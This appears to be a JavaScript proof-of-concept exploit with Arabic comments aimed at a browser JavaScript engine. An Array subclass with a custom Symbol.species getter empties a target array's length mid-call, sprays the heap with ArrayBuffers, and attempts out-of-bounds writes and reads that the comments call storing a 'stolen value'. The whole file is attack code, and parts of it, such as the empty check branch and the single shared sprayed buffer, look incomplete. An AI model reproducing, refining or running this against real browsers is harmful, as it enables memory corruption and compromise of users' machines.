let Trigger = false;
let Arr = null;
let ab = new ArrayBuffer(0x1000); // حاوية أكبر
let y = new Uint32Array(ab); // لتخزين القيمة المسروقة

function Target(Special, Idx, Value) {
    // تعبئة الذاكرة بقيمة معروفة
    Arr.fill(0x41414141);
    Special.slice(); // استهداف الكائن
    Arr[Idx] = Value; // كتابة القيمة في الفهرس
    y[0] = Arr[Idx]; // محاولة قراءة القيمة
    if (Idx === 0x20 && Trigger) {
        // يمكن إضافة تحقق هنا لاحقًا
    }
    //alert(`Target called, Arr[${Idx.toString(16)}] = ${Arr[Idx].toString(16)}, y[0] = ${y[0].toString(16)}`);
}

class SoSpecial extends Array {
    static get [Symbol.species]() {
        return function() {
            if (Trigger) {
                Arr.length = 0; // تحرير الطول
                let spray = new Array(0x1000).fill(new ArrayBuffer(0x100)); // heap spraying
            }
        };
    }
};

function main() {
    const Snowflake = new SoSpecial();
    Arr = new Array(0x21); // مصفوفة أصغر لتسهيل OOB
    Arr.fill(0);
    // تكرار لزيادة فرصة OOB
    for (let Idx = 0; Idx < 0x800; Idx++) {
        Target(Snowflake, Idx, 0xdeadbeef);
    }
    Trigger = true;
    Target(Snowflake, 0x20, 0xdeadc0de); // قيمة مختلفة للتحقق
    alert(`Final Arr[0x20] = ${Arr[0x20].toString(16)}`);
    alert(`y[0] = ${y[0].toString(16)}`);
    alert(`Arr.length = ${Arr.length}`);
}

main();